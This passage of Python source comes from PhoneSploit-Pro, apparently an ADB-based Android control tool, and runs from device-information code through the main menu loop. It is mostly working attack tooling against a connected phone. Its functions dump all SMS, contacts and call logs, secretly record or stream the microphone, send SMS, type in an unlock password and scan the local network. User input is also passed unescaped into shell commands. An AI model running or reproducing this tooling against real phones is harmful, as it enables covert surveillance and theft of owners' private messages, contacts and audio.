    device = os.popen(f"adb shell getprop ro.product.vendor.device").read()
    sim = os.popen(f"adb shell getprop gsm.sim.operator.alpha").read()
    encryption_state = os.popen(f"adb shell getprop ro.crypto.state").read()
    build_date = os.popen(f"adb shell getprop ro.build.date").read()
    sdk_version = os.popen(f"adb shell getprop ro.build.version.sdk").read()
    wifi_interface = os.popen(f"adb shell getprop wifi.interface").read()

    print(
        f"""
    {color.YELLOW}Model :{color.WHITE} {model}\
    {color.YELLOW}Manufacturer :{color.WHITE} {manufacturer}\
    {color.YELLOW}Chipset :{color.WHITE} {chipset}\
    {color.YELLOW}Android Version :{color.WHITE} {android}\
    {color.YELLOW}Security Patch :{color.WHITE} {security_patch}\
    {color.YELLOW}Device :{color.WHITE} {device}\
    {color.YELLOW}SIM :{color.WHITE} {sim}\
    {color.YELLOW}Encryption State :{color.WHITE} {encryption_state}\
    {color.YELLOW}Build Date :{color.WHITE} {build_date}\
    {color.YELLOW}SDK Version :{color.WHITE} {sdk_version}\
    {color.YELLOW}WiFi Interface :{color.WHITE} {wifi_interface}\
"""
    )


def battery_info():
    battery = os.popen(f"adb shell dumpsys battery").read()
    print(
        f"""\n{color.YELLOW}Battery Information :
{color.WHITE}{battery}\n"""
    )


def send_sms():
    print(
        f"\n{color.RED}[Warning] {color.CYAN}This feature is currently in BETA, Tested on Android 12 only{color.WHITE}"
    )

    number = input(
        f"{color.YELLOW}\nEnter Phone number with country code{color.WHITE} (e.g. +91XXXXXXXXXX) > "
    )

    if number == "":
        print(
            f"\n{color.RED} Null Input\n{color.GREEN} Going back to Main Menu{color.WHITE}"
        )
        return
    else:
        message = input(f"{color.YELLOW}\nEnter your message {color.WHITE}> ")

        print(f"{color.CYAN}\nSending SMS to {number} ...{color.WHITE}")
        os.system(
            f'adb shell service call isms 5 i32 0 s16 "com.android.mms.service" s16 "null" s16 "{number}" s16 "null" s16 "{message}" s16 "null" s16 "null" s16 "null" s16 "null"'
        )


def unlock_device():
    password = input(
        f"{color.YELLOW}\nEnter password or Press 'Enter' for blank{color.WHITE} > "
    )
    os.system("adb shell input keyevent 26")
    os.system("adb shell input swipe 200 900 200 300 200")
    if not password == "":  # if password is not blank
        os.system(f'adb shell input text "{password}"')
    os.system("adb shell input keyevent 66")
    print(f"{color.GREEN}\nDevice unlocked{color.WHITE}")


def lock_device():
    os.system("adb shell input keyevent 26")
    print(f"{color.GREEN}\nDevice locked{color.WHITE}")


def dump_sms():
    global pull_location
    if pull_location == "":
        print(
            f"\n{color.YELLOW}Enter location to save SMS file, Press 'Enter' for default{color.WHITE}"
        )
        pull_location = input("> ")
    if pull_location == "":
        pull_location = "Downloaded-Files"
        print(
            f"\n{color.PURPLE}Saving SMS file to PhoneSploit-Pro/{pull_location}\n{color.WHITE}"
        )
    else:
        print(f"\n{color.PURPLE}Saving SMS file to {pull_location}\n{color.WHITE}")
    print(f"{color.GREEN}\nExtracting all SMS{color.WHITE}")

    instant = datetime.datetime.now()
    file_name = f"sms_dump-{instant.year}-{instant.month}-{instant.day}-{instant.hour}-{instant.minute}-{instant.second}.txt"
    os.system(
        f"adb shell content query --uri content://sms/ --projection address:date:body > {pull_location}/{file_name}"
    )


def dump_contacts():
    global pull_location
    if pull_location == "":
        print(
            f"\n{color.YELLOW}Enter location to save Contacts file, Press 'Enter' for default{color.WHITE}"
        )
        pull_location = input("> ")
    if pull_location == "":
        pull_location = "Downloaded-Files"
        print(
            f"\n{color.PURPLE}Saving Contacts file to PhoneSploit-Pro/{pull_location}\n{color.WHITE}"
        )
    else:
        print(f"\n{color.PURPLE}Saving Contacts file to {pull_location}\n{color.WHITE}")
    print(f"{color.GREEN}\nExtracting all Contacts{color.WHITE}")

    instant = datetime.datetime.now()
    file_name = f"contacts_dump-{instant.year}-{instant.month}-{instant.day}-{instant.hour}-{instant.minute}-{instant.second}.txt"
    os.system(
        f"adb shell content query --uri content://contacts/phones/  --projection display_name:number > {pull_location}/{file_name}"
    )


def dump_call_logs():
    global pull_location
    if pull_location == "":
        print(
            f"\n{color.YELLOW}Enter location to save Call Logs file, Press 'Enter' for default{color.WHITE}"
        )
        pull_location = input("> ")
    if pull_location == "":
        pull_location = "Downloaded-Files"
        print(
            f"\n{color.PURPLE}Saving Call Logs file to PhoneSploit-Pro/{pull_location}\n{color.WHITE}"
        )
    else:
        print(
            f"\n{color.PURPLE}Saving Call Logs file to {pull_location}\n{color.WHITE}"
        )
    print(f"{color.GREEN}\nExtracting all Call Logs{color.WHITE}")

    instant = datetime.datetime.now()
    file_name = f"call_logs_dump-{instant.year}-{instant.month}-{instant.day}-{instant.hour}-{instant.minute}-{instant.second}.txt"
    os.system(
        f"adb shell content query --uri content://call_log/calls --projection name:number:duration:date > {pull_location}/{file_name}"
    )


def extract_apk():
    print(
        f"""
    {color.WHITE}1.{color.GREEN} Select from App List
    {color.WHITE}2.{color.GREEN} Enter Package Name Manually
    {color.WHITE}"""
    )

    mode = input("> ")
    if mode == "1":
        # Listing third party apps
        list = os.popen("adb shell pm list packages -3").read().split("\n")
        list.remove("")
        i = 0
        print("\n")
        for app in list:
            i += 1
            app = app.replace("package:", "")
            print(f"{color.GREEN}{i}.{color.WHITE} {app}")

        # Selection of app
        app = input("\nEnter Selection > ")
        if app.isdigit():
            if int(app) <= len(list) and int(app) > 0:
                package_name = list[int(app) - 1].replace("package:", "")
                print(
                    f"\n{color.RED}Extracting {color.YELLOW}{package_name}{color.WHITE}"
                )

            else:
                print(
                    f"\n{color.RED} Invalid selection\n{color.GREEN} Going back to Main Menu{color.WHITE}"
                )
                return
        else:
            print(
                f"\n{color.RED} Expected an Integer Value\n{color.GREEN} Going back to Main Menu{color.WHITE}"
            )
            return

    elif mode == "2":
        ## OLD
        print(
            f"\n{color.CYAN}Enter package name     {color.WHITE}Example : com.spotify.music "
        )
        package_name = input("> ")

        if package_name == "":
            print(
                f"\n{color.RED} Null Input\n{color.GREEN} Going back to Main Menu{color.WHITE}"
            )
            return
        print(f"\n{color.RED}Extracting {color.YELLOW}{package_name}{color.WHITE}")

    # If not returned then continue extraction
    global pull_location
    if pull_location == "":
        print(
            f"\n{color.YELLOW}Enter location to save APK file, Press 'Enter' for default{color.WHITE}"
        )
        pull_location = input("> ")
    if pull_location == "":
        pull_location = "Downloaded-Files"
        print(
            f"\n{color.PURPLE}Saving APK file to PhoneSploit-Pro/{pull_location}\n{color.WHITE}"
        )
    else:
        print(f"\n{color.PURPLE}Saving APK file to {pull_location}\n{color.WHITE}")

    print(f"{color.GREEN}\nExtracting APK...{color.WHITE}")

    try:
        path = os.popen(f"adb shell pm path {package_name}").read()
        path = path.replace("package:", "")
        os.system(f"adb pull {path}")
        file_name = package_name.replace(".", "_")
        # os.system(f'{move} base.apk {pull_location}/{file_name}.apk')
        os.rename("base.apk", f"{pull_location}/{file_name}.apk")

    except FileNotFoundError:
        print(f"\n\n{color.RED} Error : {color.GREEN}App Not Found {color.WHITE}\n")

    except FileExistsError:
        print(
            f"\n\n{color.RED} Error : {color.GREEN}APK already exists in {pull_location} {color.WHITE}\n"
        )
    print("\n")


def mirror():
    print(
        f"""
    {color.WHITE}1.{color.GREEN} Default Mode   {color.YELLOW}(Best quality)
    {color.WHITE}2.{color.GREEN} Fast Mode      {color.YELLOW}(Low quality but high performance)
    {color.WHITE}3.{color.GREEN} Custom Mode    {color.YELLOW}(Tweak settings to increase performance)
    {color.WHITE}"""
    )
    mode = input("> ")
    if mode == "1":
        os.system("scrcpy")
    elif mode == "2":
        os.system("scrcpy -m 1024 -b 1M")
    elif mode == "3":
        print(f"\n{color.CYAN}Enter size limit {color.YELLOW}(e.g. 1024){color.WHITE}")
        size = input("> ")
        if not size == "":
            size = "-m " + size

        print(
            f"\n{color.CYAN}Enter bit-rate {color.YELLOW}(e.g. 2)   {color.WHITE}(Default : 8 Mbps)"
        )
        bitrate = input("> ")
        if not bitrate == "":
            bitrate = "-b " + bitrate + "M"

        print(f"\n{color.CYAN}Enter frame-rate {color.YELLOW}(e.g. 15){color.WHITE}")
        framerate = input("> ")
        if not framerate == "":
            framerate = "--max-fps=" + framerate

        os.system(f"scrcpy {size} {bitrate} {framerate}")
    else:
        print(
            f"\n{color.RED} Invalid selection\n{color.GREEN} Going back to Main Menu{color.WHITE}"
        )
        return
    print("\n")


def power_off():
    print(
        f"\n{color.RED}[Warning]{color.YELLOW} Powering off device will disconnect the device{color.WHITE}"
    )
    choice = input("\nDo you want to continue?     Y / N > ").lower()
    if choice == "y" or choice == "":
        pass
    elif choice == "n":
        return
    else:
        while choice != "y" and choice != "n" and choice != "":
            choice = input("\nInvalid choice!, Press Y or N > ").lower()
            if choice == "y" or choice == "":
                pass
            elif choice == "n":
                return
    os.system(f"adb shell reboot -p")
    print("\n")


def update_me():
    print(f"{color.YELLOW}\nUpdating PhoneSploit-Pro\n{color.WHITE}")
    print(f"{color.GREEN}Fetching latest updates from GitHub\n{color.WHITE}")
    os.system("git fetch")
    print(f"{color.GREEN}\nApplying changes\n{color.WHITE}")
    os.system("git rebase")
    print(f"{color.CYAN}\nPlease restart PhoneSploit-Pro{color.WHITE}")
    exit_phonesploit_pro()


def visit_me():
    os.system(f"{opener} https://github.com/AzeemIdrisi/PhoneSploit-Pro")
    print("\n")


def scan_network():
    print(f"\n{color.GREEN}Scanning network for connected devices...{color.WHITE}\n")
    ip = get_ip_address()
    ip += "/24"

    scanner = nmap.PortScanner()
    scanner.scan(hosts=ip, arguments="-sn")
    for host in scanner.all_hosts():
        if scanner[host]["status"]["state"] == "up":
            try:
                if len(scanner[host]["vendor"]) == 0:
                    try:
                        print(
                            f"[{color.GREEN}+{color.WHITE}] {host}      \t {socket.gethostbyaddr(host)[0]}"
                        )
                    except:
                        print(f"[{color.GREEN}+{color.WHITE}] {host}")
                else:
                    try:
                        print(
                            f"[{color.GREEN}+{color.WHITE}] {host}      \t {scanner[host]['vendor']}      \t {socket.gethostbyaddr(host)[0]}"
                        )
                    except:
                        print(
                            f"[{color.GREEN}+{color.WHITE}] {host}      \t {scanner[host]['vendor']}"
                        )
            except:
                print(
                    f"[{color.GREEN}+{color.WHITE}] {host}      \t {scanner[host]['vendor']}"
                )

    print("\n")


def record_audio(mode):
    print(
        f"\n{color.RED}[Notice] {color.CYAN}This feature is currently available for devices running on Android 11 or higher only.{color.WHITE}"
    )
    try:
        androidVersion = os.popen("adb shell getprop ro.build.version.release").read()
        android_os = int(androidVersion.split(".")[0])
        print(f"\n{color.GREEN}Detected Android Version : {androidVersion}")
    except ValueError:
        print(
            f"\n{color.RED} No connected device found\n{color.GREEN} Going back to Main Menu{color.WHITE}"
        )
        return

    if android_os < 11:
        print(f"{color.RED}Going back to Main Menu{color.WHITE}")
        return

    global pull_location
    if pull_location == "":
        print(
            f"\n{color.YELLOW}Enter location to save Recordings, Press 'Enter' for default{color.WHITE}"
        )
        pull_location = input("> ")
    if pull_location == "":
        pull_location = "Downloaded-Files"
        print(
            f"\n{color.PURPLE}Saving recordings to PhoneSploit-Pro/{pull_location}\n{color.WHITE}"
        )
    else:
        print(f"\n{color.PURPLE}Saving recordings to {pull_location}\n{color.WHITE}")

    match mode:
        case "mic":
            instant = datetime.datetime.now()
            file_name = f"mic-audio-{instant.year}-{instant.month}-{instant.day}-{instant.hour}-{instant.minute}-{instant.second}.opus"
            print(
                f"""
            {color.WHITE}1.{color.GREEN} Stream & Record   {color.YELLOW}
            {color.WHITE}2.{color.GREEN} Record Only     {color.YELLOW}(Fast)
            {color.WHITE}"""
            )
            choice = input("> ")
            if choice == "1":
                print(
                    f"\n{color.GREEN}Recording Microphone Audio \n\n{color.RED}Press Ctrl+C to Stop.\n{color.WHITE}"
                )
                os.system(
                    f"scrcpy --no-video --audio-source=mic --record={pull_location}/{file_name}"
                )
            elif choice == "2":
                print(
                    f"\n{color.GREEN}Recording Microphone Audio \n\n{color.RED}Press Ctrl+C to Stop.\n{color.WHITE}"
                )
                os.system(
                    f"scrcpy --no-video --audio-source=mic --no-playback --record={pull_location}/{file_name}"
                )
            else:
                print(
                    f"\n{color.RED} Invalid selection\n{color.GREEN} Going back to Main Menu{color.WHITE}"
                )
                return

        case "device":
            instant = datetime.datetime.now()
            file_name = f"device-audio-{instant.year}-{instant.month}-{instant.day}-{instant.hour}-{instant.minute}-{instant.second}.opus"
            print(
                f"""
            {color.WHITE}1.{color.GREEN} Stream & Record   {color.YELLOW}
            {color.WHITE}2.{color.GREEN} Record Only     {color.YELLOW}(Fast)
            {color.WHITE}"""
            )
            choice = input("> ")

            if choice == "1":
                print(
                    f"\n{color.GREEN}Recording Device Audio \n\n{color.RED}Press Ctrl+C to Stop.\n{color.WHITE}"
                )
                os.system(f"scrcpy --no-video --record={pull_location}/{file_name}")

                # Asking to open file
                choice = input(
                    f"\n{color.GREEN}Do you want to Open the file?     Y / N {color.WHITE}> "
                ).lower()
                if choice == "y" or choice == "":
                    os.system(f"{opener} {pull_location}/{file_name}")

                elif not choice == "n":
                    while choice != "y" and choice != "n" and choice != "":
                        choice = input("\nInvalid choice!, Press Y or N > ").lower()
                        if choice == "y" or choice == "":
                            os.system(f"{opener} {pull_location}/{file_name}")

            elif choice == "2":
                print(
                    f"\n{color.GREEN}Recording Device Audio \n\n{color.RED}Press Ctrl+C to Stop.\n{color.WHITE}"
                )
                os.system(
                    f"scrcpy --no-video --no-playback --record={pull_location}/{file_name}"
                )

                # Asking to open file
                choice = input(
                    f"\n{color.GREEN}Do you want to Open the file?     Y / N {color.WHITE}> "
                ).lower()
                if choice == "y" or choice == "":
                    os.system(f"{opener} {pull_location}/{file_name}")

                elif not choice == "n":
                    while choice != "y" and choice != "n" and choice != "":
                        choice = input("\nInvalid choice!, Press Y or N > ").lower()
                        if choice == "y" or choice == "":
                            os.system(f"{opener} {pull_location}/{file_name}")

            else:
                print(
                    f"\n{color.RED} Invalid selection\n{color.GREEN} Going back to Main Menu{color.WHITE}"
                )
                return
    print("\n")


def stream_audio(mode):
    print(
        f"\n{color.RED}[Notice] {color.CYAN}This feature is currently available for devices running on Android 11 or higher only.{color.WHITE}"
    )
    try:
        androidVersion = os.popen("adb shell getprop ro.build.version.release").read()
        android_os = int(androidVersion.split(".")[0])
        print(f"\n{color.GREEN}Detected Android Version : {androidVersion}")
    except ValueError:
        print(
            f"\n{color.RED} No connected device found\n{color.GREEN} Going back to Main Menu{color.WHITE}"
        )
        return

    if android_os < 11:
        print(f"{color.RED}Going back to Main Menu{color.WHITE}")
        return

    match mode:
        case "mic":
            print(
                f"\n{color.GREEN}Streaming Microphone Audio \n\n{color.RED}Press Ctrl+C to Stop.\n{color.WHITE}"
            )
            os.system("scrcpy --no-video --audio-source=mic")

        case "device":
            print(
                f"\n{color.GREEN}Streaming Device Audio \n\n{color.RED}Press Ctrl+C to Stop.\n{color.WHITE}"
            )
            os.system("scrcpy --no-video")

    print("\n")


def main():
    # Clearing the screen and presenting the menu
    # taking selection input from user
    print(f"\n {color.CYAN}99 : Clear Screen                0 : Exit")
    option = input(f"\n{color.RED}[Main Menu] {color.WHITE}Enter selection > ").lower()

    match option:
        case "p":
            change_page("p")
        case "n":
            change_page("n")
        case "release":
            from modules import release
        case "0":
            exit_phonesploit_pro()
        case "99":
            clear_screen()
        case "1":
            connect()
        case "2":
            list_devices()
        case "3":
            disconnect()
        case "4":
            scan_network()
        case "5":
            mirror()
        case "6":
            get_screenshot()
        case "7":
            screenrecord()
        case "8":
            pull_file()
        case "9":
            push_file()
        case "10":
            launch_app()
        case "11":
            install_app()
        case "12":
            uninstall_app()
        case "13":
            list_apps()
        case "14":
            get_shell()
        case "15":
            hack()
        case "16":
            list_files()
        case "17":
            send_sms()
        case "18":
            copy_whatsapp()
        case "19":
            copy_screenshots()
        case "20":
            copy_camera()
        case "21":
            anonymous_screenshot()
        case "22":
            anonymous_screenrecord()
        case "23":
            open_link()
        case "24":
            open_photo()
        case "25":
            open_audio()
        case "26":
            open_video()
        case "27":
            get_device_info()
        case "28":
            battery_info()
        case "29":
            reboot("system")
        case "30":
            reboot("advanced")
        case "31":
            unlock_device()
        case "32":
            lock_device()
        case "33":
            dump_sms()
        case "34":
            dump_contacts()
        case "35":
            dump_call_logs()
        case "36":
            extract_apk()
        case "37":
            stop_adb()
        case "38":
            power_off()
        case "39":
            use_keycode()
        case "40":
            stream_audio("mic")
        case "41":
            record_audio("mic")
        case "42":
            stream_audio("device")
        case "43":
            record_audio("device")
        case "44":
            update_me()
        case "45":
            visit_me()
        case other:
            print("\nInvalid selection!\n")


# Starting point of the program

# Global variables
run_phonesploit_pro = True
operating_system = ""
clear = "clear"
opener = "xdg-open"
# move = 'mv'
page_number = 0
page = banner.menu[page_number]

# Locations
screenshot_location = ""
screenrecord_location = ""
pull_location = ""

# Concatenating banner color with the selected banner
selected_banner = random.choice(color.color_list) + random.choice(banner.banner_list)

start()

if run_phonesploit_pro:
    clear_screen()
    while run_phonesploit_pro:
        try:
            main()
        except KeyboardInterrupt:
            exit_phonesploit_pro()


"""
Copyright © 2023 Mohd Azeem (github.com/AzeemIdrisi)
"""
